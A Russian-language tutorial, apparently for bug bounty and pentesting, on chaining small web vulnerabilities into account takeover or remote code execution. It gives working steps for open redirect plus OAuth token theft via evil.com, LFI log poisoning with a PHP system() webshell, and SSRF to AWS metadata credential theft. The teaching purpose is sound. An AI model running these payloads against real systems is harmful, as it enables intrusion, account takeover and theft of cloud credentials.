Построение цепочек атак (chain composition) — это умение соединять несколько «незначительных» находок в один критичный эксплойт. Отдельно взятая XSS может быть low, открытый редирект — low, отсутствие CSRF-токена — medium. Но вместе они дают захват аккаунта. Этот урок — про то, как думать цепочками, какие связки встречаются чаще всего и как доводить их до артефакта.

## Зачем думать цепочками

Реальные системы защищены слоями, и один баг редко пробивает их все. Зато несколько небольших багов, соединённых последовательно, обходят каждый слой по очереди. Атакующий не ищет «одну критичную дыру» — он ищет **путь**. Именно поэтому в баг-баунти цепочки ценятся выше отдельных находок: они показывают реальный импакт.

Принцип: каждая находка — это **примитив** (что вы умеете). Цепочка — это последовательность примитивов, приводящая к цели (данные, код, доступ). Ваша задача — собрать граф примитивов и найти путь.

## Каталог примитивов

Начните с инвентаризации: что вы умеете после разведки и триажа. Типовые примитивы: читать чужой объект (IDOR), выполнять JS в контексте жертвы (XSS), заставить сервер сходить по URL (SSRF), читать файлы (LFI), загружать файл (upload), подделывать запрос (CSRF), перенаправлять (open redirect), подделывать токен (JWT/remember-me), читать чужой ответ (CORS/JSONP), выполнять код (RCE), повышать привилегии.

```bash
# пример: инвентаризация находок в одном месте
# IDOR на /api/orders/{id}
# XSS в /search?q=
# SSRF в /fetch?url=
# open redirect в /out?next=
```

## Классические цепочки

Ниже — проверенные связки, которые стоит держать в голове.

| Цепочка | Примитивы | Результат |
|---------|-----------|-----------|
| open redirect + OAuth | redirect + доверие redirect_uri | кража токена → захват аккаунта |
| XSS + CSRF-обход | XSS на целевом домене | выполнение действий от жертвы |
| SSRF + metadata | SSRF + облако | креды роли → доступ к ресурсам |
| LFI + log poisoning | LFI + запись в лог | RCE |
| upload + path traversal | upload + traversal | запись webshell вне каталога |
| IDOR + mass assignment | IDOR + лишние поля | повышение привилегий |
| JSONP/CORS + XSS | чтение данных + выполнение | кража токенов |
| prototype pollution + gadget | загрязнение + триггер | RCE |
| cache poisoning + XSS | отравление кэша | массовая XSS |
| request smuggling + auth bypass | десинхронизация | доступ к чужим запросам |

## Разобранный пример: open redirect → OAuth → захват аккаунта

```bash
# 1. находим open redirect
$ curl -sI 'https://t/out?next=https://evil.com' | grep -i location
location: https://evil.com

# 2. OAuth-провайдер доверяет только t, но redirect_uri можно направить на t/out
#    и через него уйти на evil
AUTH='https://auth.t/authorize?client_id=app&redirect_uri=https://t/out%3Fnext%3Dhttps://evil.com&response_type=code'
# 3. жертва открывает AUTH, после логина код уходит на evil
# 4. атакующий меняет code на токен
curl -s 'https://auth.t/token' -d 'grant_type=authorization_code&code=STOLEN&redirect_uri=...&client_id=app'
```

Артефакт — access-token жертвы, полученный через цепочку.

## Разобранный пример: LFI → log poisoning → RCE

```bash
# 1. LFI
$ curl -s 'https://t/?file=../../../../var/log/nginx/access.log' | tail -1

# 2. пишем PHP в лог через User-Agent
$ curl -s https://t/ -A '<?php system($_GET["c"]); ?>'

# 3. включаем лог как PHP через LFI
$ curl -s 'https://t/?file=/var/log/nginx/access.log&c=id'
uid=33(www-data) gid=33(www-data)
```

## Разобранный пример: SSRF → metadata → RCE

```bash
# 1. SSRF
$ curl -s 'https://t/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
ec2-admin-role
# 2. креды
$ curl -s 'https://t/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin-role'
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
# 3. используем
$ AWS_ACCESS_KEY_ID=ASIA... aws s3 ls
```

## Как строить цепочку методично

Первый шаг — **граф примитивов**: выпишите все находки и их «вход/выход». Например, SSRF даёт «запрос от сервера», metadata даёт «креды», AWS CLI даёт «доступ к S3». Второй шаг — **соединение**: ищите пары, где выход одного примитива является входом другого. Третий шаг — **проверка**: пройдите цепочку по шагам, убеждаясь, что каждый переход работает. Четвёртый шаг — **артефакт**: доведите до данных/кода/доступа. Пятый шаг — **минимизация**: уберите лишние шаги, оставьте самый короткий работающий путь.

```bash
# пример карты
# [SSRF] -> http://169.254.169.254  -> [creds]
# [creds] -> aws s3 ls              -> [data]
# [IDOR]  -> /api/orders/{id}       -> [чужие заказы]
# [XSS]   -> /search?q=             -> [execute JS]
# [CSRF-нет токена] -> смена email  -> [захват]
# связка: XSS + CSRF-нет -> выполнить смену email от жертвы
```

## Крайние случаи и подводные камни

- **Каждый переход должен работать.** Цепочка рвётся на слабом звене — проверяйте пошагово.
- **Контекст.** XSS на поддомене не всегда даёт доступ к основному домену (cookie-скоуп).
- **Тайминги.** Некоторые шаги (кэш, гонки) требуют точного порядка.
- **Детект.** Длинные цепочки шумят; на реальном пентесте согласуйте.
- **Не переусложняйте.** Иногда достаточно двух шагов; не стройте «научную работу».

## Что делать дальше / решение

1. **Соберите примитивы** — все находки и их вход/выход.
2. **Постройте граф** — какие выходы соединяются со входами.
3. **Найдите путь** к цели (данные/код/доступ).
4. **Пройдите по шагам** — проверьте каждый переход.
5. **Доведите до артефакта** — дамп, `id`, токен, чужой объект.
6. **Минимизируйте** — оставьте кратчайшую работающую цепочку.
7. **Зафиксируйте** — пошаговый PoC в отчёт.

## Глубже: как оценивать цепочку

Оценка цепочки — не сумма оценок звеньев. Три low-бага, соединённые в захват аккаунта, дают критичный импакт, потому что именно цепочка показывает реальный риск. При оценке задайте вопросы: какова **цель** (данные/код/доступ)? Работает ли цепочка **без участия** жертвы (или требует клика)? Насколько она **надёжна** (детерминированная или зависит от тайминга)? Насколько **уникальна** (не требует редких условий)? Ответы определяют уровень: полный захват аккаунта без клика и с надёжным PoC — критично; то же с кликом — высоко; утечка нечувствительных данных — средне/низко.

Отдельно оцените **шаговость** для отчёта: каждая ступень должна быть воспроизводима. Если цепочка зависит от гонки или кэша, укажите условия (сколько запросов, какой тайминг), чтобы эксперт повторил. И всегда доводите до артефакта — это отличает «теоретическую цепочку» от подтверждённой.

## Глубже: инструменты для сборки цепочек

Инструменты помогают не строить цепочки автоматически (это творческая работа), а проверять звенья. Burp Repeater — для пошаговой проверки каждого перехода. Turbo Intruder — для гонок и параллельных шагов. Collaborator/interactsh — для OOB-звеньев (SSRF, blind RCE). `jq` — для извлечения значений из ответов и подстановки в следующие запросы. Скрипт на Python/`requests` — чтобы автоматизировать всю цепочку целиком и доказать её воспроизводимость.

```python
# псевдо-скрипт цепочки: SSRF -> metadata -> creds -> доступ
import requests
creds = requests.get("https://t/fetch", params={"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin-role"}).json()
# далее — использование кредов
```

Такой скрипт — сильный артефакт: он доказывает, что цепочка работает end-to-end, а не только в теории.

## Итог

Chain composition — это мышление графами примитивов. Каждая находка — узел; цепочка — путь к цели. Начинайте с инвентаризации, соединяйте выход одного примитива со входом другого, проверяйте каждый переход и доводите до артефакта. Помните классические связки (redirect+OAuth, XSS+CSRF, SSRF+metadata, LFI+log, upload+traversal) — они встречаются постоянно. И фиксируйте минимальную работающую цепочку: она и есть ваш отчёт.

## Частые ошибки при построении цепочек

Первая ошибка — оценивать звенья по отдельности и бросать «мелкие» находки. Low-баг, который соединяется с другим, часто оказывается решающим. Вторая — не проверять каждый переход: цепочка может рваться на шаге, который «должен работать», но не работает из-за контекста (например, cookie-скоуп, CSP, SameSite). Третья — забывать про тайминг: кэш-пуазинг, гонки и SSRF-цепочки зависят от порядка и времени, и без этого PoC не воспроизводится. Четвёртая — строить слишком длинную цепочку, где каждое звено хрупкое; иногда лучше найти короткий путь. Пятая — не документировать условия. Хороший PoC цепочки — это пошаговая инструкция с командами, которая воспроизводится у эксперта с первого раза.
